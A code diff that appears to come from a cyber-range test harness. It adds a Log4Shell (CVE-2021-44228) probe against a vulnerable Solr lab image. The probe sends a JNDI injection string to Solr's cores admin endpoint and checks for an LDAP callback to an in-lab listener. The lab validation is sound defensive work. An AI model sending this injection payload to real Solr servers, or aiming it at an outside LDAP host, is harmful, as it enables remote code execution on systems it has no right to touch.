@@ -4,9 +4,11 @@ from __future__ import annotations
 import json
 import re
 import sqlite3
+import time
 import uuid
 from datetime import datetime, timezone
 from typing import Any
+from urllib.parse import quote
 
 from cr_contracts import iter_errors
 
@@ -349,19 +351,82 @@ def _struts_s2045_probe(scenario_id: str, source: str, target: str, port: int) -
     return status, expected, observed, reproduced
 
 
+def _solr_action_request(scenario_id: str, source: str, target: str, port: int, action_value: str) -> str:
+    """Issue one Solr cores admin request from the source container to the target."""
+    path = "/solr/admin/cores?action=" + quote(action_value, safe="")
+    script = (
+        "import urllib.request\n"
+        f"try:\n"
+        f" urllib.request.urlopen('http://{target}:{port}{path}', timeout=8).read()\n"
+        " print('sent')\n"
+        "except Exception as e:\n"
+        " print('sent-with-status='+type(e).__name__)"
+    )
+    return _result_output(manager.probe_in_service(scenario_id, source, script, timeout=20))
+
+
+def _log4shell_solr_probe(scenario_id: str, source: str, target: str, port: int) -> tuple[str, str, str, bool]:
+    """Real Log4Shell (CVE-2021-44228) probe using the in-lab cr-listener.
+
+    A benign request must produce no callback; a JNDI injection pointing at the in-lab
+    listener must produce an LDAP callback whose source is the target host. The listener
+    returns nothing, so the JNDI lookup fires with no class load / RCE. Without a listener
+    in the plan, this is NOT_TESTED (never a false PASS).
+    """
+    expected = ("benign request causes 0 callbacks; JNDI injection causes an LDAP bindRequest "
+                "from the target host to the in-lab listener")
+    listener = manager.callback_listener(scenario_id)
+    if not listener:
+        return "NOT_TESTED", expected, "no in-lab JNDI/LDAP listener (cr-listener) was generated for this plan", False
+    cb0 = manager.callback_events(scenario_id)
+    if not cb0.get("running"):
+        return "NOT_TESTED", expected, f"listener not available: {cb0.get('error')}", False
+    listener_host = str(listener.get("id", "cr-listener"))
+    listener_port = int(listener.get("port", 1389))
+
+    def last_ts(events: list[dict[str, Any]]) -> str | None:
+        return events[-1]["ts"] if events else None
+
+    base_ts = last_ts(cb0.get("events", []))
+    benign_resp = _solr_action_request(scenario_id, source, target, port, "STATUS")
+    time.sleep(2)
+    cbb = manager.callback_events(scenario_id, since=base_ts)
+    benign_from_target = [e for e in cbb.get("events", []) if e.get("peer_host") == target]
+    benign_ts = last_ts(cbb.get("events", [])) or base_ts
+
+    jndi = "${jndi:ldap://%s:%d/sol}" % (listener_host, listener_port)
+    inject_resp = _solr_action_request(scenario_id, source, target, port, jndi)
+    time.sleep(3)
+    cbi = manager.callback_events(scenario_id, since=benign_ts)
+    inject_from_target = [e for e in cbi.get("events", []) if e.get("peer_host") == target]
+
+    reproduced = (not benign_from_target) and bool(inject_from_target)
+    observed = (f"benign({benign_resp})->callbacks_from_{target}={len(benign_from_target)}; "
+                f"inject({inject_resp})->callbacks_from_{target}={len(inject_from_target)}; "
+                f"events={inject_from_target[:2]}")
+    if reproduced:
+        status = "PASS"
+    elif benign_from_target:
+        status = "FAIL"
+        observed = "benign request already produced a callback from the target (cannot attribute to the injection); " + observed
+    elif "sent" in inject_resp and not inject_from_target:
+        status = "FAIL"
+    else:
+        status = "NOT_TESTED"
+    return status, expected, observed, reproduced
+
+
 # Action-specific attack probes keyed by the target's catalogue component id. Each is
 # a real, harmless proof-of-capability against the real vulnerable image.
 _ATTACK_PROBES = {
     "vuln-struts2-s2-045": _struts_s2045_probe,
+    "vuln-log4shell-solr": _log4shell_solr_probe,
 }
 
 # Vulnerable images whose faithful probe needs infra not present in a plain product
-# plan (e.g. an in-lab JNDI listener). These are reported NOT_TESTED in-product with a
-# pointer to the standalone Phase 3 harness, never silently PASS.
-_ATTACK_PROBES_NEEDING_INFRA = {
-    "vuln-log4shell-solr": "requires an in-lab JNDI/LDAP listener host; covered by the "
-                           "Phase 3 standalone harness (tests/e2e/phase3-real-poc/run_log4shell_solr.py)",
-}
+# plan. The probe itself returns NOT_TESTED (never a false PASS) when that infra is
+# absent, so nothing is listed here unconditionally now.
+_ATTACK_PROBES_NEEDING_INFRA: dict[str, str] = {}
 
 
 def _build_substitutes(components: list[dict[str, Any]]) -> list[dict[str, Any]]:
